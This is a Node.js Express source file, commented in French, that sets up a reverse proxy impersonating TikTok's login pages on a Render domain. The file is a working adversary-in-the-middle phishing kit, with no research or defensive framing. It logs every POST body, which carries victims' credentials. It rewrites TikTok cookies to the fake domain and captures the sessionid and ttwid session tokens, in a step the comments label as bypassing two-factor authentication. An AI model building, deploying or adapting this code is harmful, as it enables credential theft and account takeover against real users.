const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// Sert ton interface personnalisée à la racine
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Permet de charger les images locales
app.use(express.static(path.join(__dirname)));

const proxyOptions = {
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    secure: true,
    autoRewrite: true, // Réécrit les redirections pour rester sur ton domaine Render
    followRedirects: true,
    cookieDomainRewrite: {
        ".tiktok.com": "noreplytiktok.onrender.com",
        "tiktok.com": "noreplytiktok.onrender.com"
    },
    onProxyReq: (proxyReq, req, res) => {
        // --- INTERCEPTION DES IDENTIFIANTS (POST) ---
        if (req.method === 'POST') {
            let body = '';
            req.on('data', chunk => { body += chunk; });
            req.on('end', () => {
                if (body) {
                    console.log("\n[!] DONNÉES POST CAPTURÉES :");
                    console.log(decodeURIComponent(body));
                    console.log("-------------------------------\n");
                }
            });
        }
        // Imitation d'un navigateur récent
        proxyReq.setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36');
    },
    onProxyRes: (proxyRes, req, res) => {
        // --- CAPTURE DES COOKIES DE SESSION (BYPASS 2FA) ---
        const sc = proxyRes.headers['set-cookie'];
        if (sc) {
            console.log("\n[X] FLUX DE COOKIES DÉTECTÉ");
            sc.forEach(cookie => {
                if (cookie.includes('sessionid') || cookie.includes('ttwid')) {
                    console.log(">>> JETON RÉCUPÉRÉ : " + cookie.split(';')[0]);
                }
            });
        }
    }
};

// On branche le proxy sur toutes les routes de connexion de TikTok
app.use(['/login', '/passport', '/api', '/auth'], createProxyMiddleware(proxyOptions));

app.listen(PORT, () => {
    console.log("BACOPS PROXY : TUNNEL MIROIR ACTIF");
});
